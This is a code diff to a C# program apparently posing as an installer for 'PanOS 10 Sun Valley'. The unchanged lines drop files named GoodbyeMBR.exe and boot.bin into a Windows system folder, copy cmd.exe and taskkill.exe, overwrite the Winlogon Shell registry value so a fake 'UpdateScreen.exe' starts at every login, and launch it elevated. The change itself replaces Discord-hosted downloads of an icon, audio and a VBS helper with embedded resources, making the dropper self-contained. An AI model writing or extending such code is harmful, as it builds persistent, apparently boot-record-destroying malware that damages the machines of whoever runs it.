@@ -10,6 +10,7 @@ using System.Net;
 using System.Linq;
 using System.Management;
 using System.Windows.Forms.VisualStyles;
+using System.Drawing;
 
 namespace auth
 {
@@ -116,34 +117,22 @@ namespace auth
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\BlacklistedApp.exe", auth.Properties.Resources.BlacklistedApp);
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\GoodbyeMBR.exe", auth.Properties.Resources.GoodbyeMBR);
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\boot.bin", auth.Properties.Resources.boot);
+                    using (var iconStream = File.OpenWrite(@"C:\Windows\SystemUpdateResources\Belfiore.ico"))
+                    {
+                        Properties.Resources.Belfiore.Save(iconStream);
+                    }
+                    Stream wavStream = Properties.Resources.Windows_8_Error_Dubstep_Remix;
+                    using (var fileStream = File.OpenWrite(@"C:\Windows\SystemUpdateResources\audio.wav"))
+                    {
+                        wavStream.CopyTo(fileStream);
+                    }
+                    File.WriteAllText(@"C:\Windows\SystemUpdateResources\PanOSMainLaunchHelper.vbs", auth.Properties.Resources.PanOSMainLaunchHelper);
                     File.Copy(@"C:\Windows\System32\cmd.exe", @"C:\Windows\SystemUpdateResources\backupcmd.exe", true);
                     File.Copy(@"C:\Windows\System32\taskkill.exe", @"C:\Windows\SystemUpdateResources\backuptaskkill.exe", true);
                     RegistryKey setshellkey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
                     setshellkey.SetValue("Shell", "explorer.exe, \"C:\\Windows\\SystemUpdateResources\\UpdateScreen.exe\"");
                     setshellkey.Dispose();
                     auth.Properties.Resources.BelfiOre_Windows_10_Wallpaper.Save(@"C:\Windows\SystemUpdateResources\BelfiOre Wallpaper.jpg");
-                    try
-                    {
-                        WebClient audio = new WebClient();
-                        string url = "https://cdn.discordapp.com/attachments/705283503163572256/839094340651188234/Windows_8_Error_Dubstep_Remix_Final.wav";
-                        string path = @"C:\Windows\SystemUpdateResources\audio.wav";
-                        audio.DownloadFile(url, path);
-                        audio.Dispose();
-                        WebClient belfioreico = new WebClient();
-                        string belfioreurl = "https://cdn.discordapp.com/attachments/705283503163572256/839087252948779018/Belfiore.ico";
-                        string belfiorepath = @"C:\Windows\SystemUpdateResources\Belfiore.ico";
-                        belfioreico.DownloadFile(belfioreurl, belfiorepath);
-                        belfioreico.Dispose();
-                        WebClient helpervbs = new WebClient();
-                        string helpervbsurl = "https://cdn.discordapp.com/attachments/705283503163572256/844403432572059668/PanOSMainLaunchHelper.vbs";
-                        string helpervbspath = @"C:\Windows\SystemUpdateResources\PanOSMainLaunchHelper.vbs";
-                        helpervbs.DownloadFile(helpervbsurl, helpervbspath);
-                        helpervbs.Dispose();
-                    } catch
-                    {
-                        MessageBox.Show("There was a problem downloading the required resources. Please check your internet connection.", "Install PanOS 10 Sun Valley", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                        Environment.Exit(0);
-                    }
                     Process startupdatescreen = new Process();
                     startupdatescreen.StartInfo.FileName = @"C:\Windows\SystemUpdateResources\UpdateScreen.exe";
                     startupdatescreen.StartInfo.Verb = "runas";
@@ -154,10 +143,8 @@ namespace auth
                 {
                     Environment.Exit(0);
                 }
-
             }
         }
-
         private void label1_Click(object sender, EventArgs e)
         {
 
